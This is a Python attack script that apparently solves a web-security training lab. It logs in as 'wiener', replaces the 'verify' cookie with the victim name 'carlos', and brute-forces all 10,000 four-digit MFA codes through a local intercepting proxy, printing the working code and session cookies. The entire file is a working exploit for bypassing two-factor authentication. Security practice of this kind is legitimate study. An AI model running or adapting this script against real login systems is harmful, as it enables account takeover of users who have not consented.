import requests
import sys
import urllib3
import time
# this takes long time , we need to change it to multi threading

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
nums = ["0","1","2","3","4","5","6","7","8","9"]
proxies = { 
    "http":"http://127.0.0.1:8080",
    "https":"http://127.0.0.1:8080",
}

def brute_force_otp(url:str,username:str):
    otp_url = url + '/login2'
    login_url = url+"/login"
    headers = {"Cookie":"verify=carlos"}
    session = requests.Session()
    valid_login_params ={
        "username":"wiener",
        "password":"peter"
    }
    session.post(login_url,verify=False,proxies=proxies,data=valid_login_params)
    session.cookies.pop("verify") # remove the legimate cookie 
    session.cookies.set("verify","carlos") # add the malicous cookie
    # session.get(otp_url,verify=False,proxies=proxies) # enforce the application to create an otp for the victim user
    
    for digit_one in nums:
        for digit_two in nums:
            for digit_three in nums:
                for digit_four in nums:
                    otp = digit_one +digit_two+digit_three + digit_four
                    params = {
                                "mfa-code":otp
                            }
                    response = session.post(otp_url,verify=False,proxies=proxies,data=params)
                    
                    if response.url != otp_url and response.url != login_url:
                        print(f"(+) This 1 OTP Worked {otp} , cookie: {session.cookies.values()} ")
                        sys.exit(1)
                        


def main():
    if len(sys.argv) !=3:
        print(f"(-) Usage {sys.argv[0]} http://example.com/ victim_username")
        sys.exit(-1)

    url = sys.argv[1]
    username = sys.argv[2]
    brute_force_otp(url,username)

if __name__ =="__main__":
    
    main()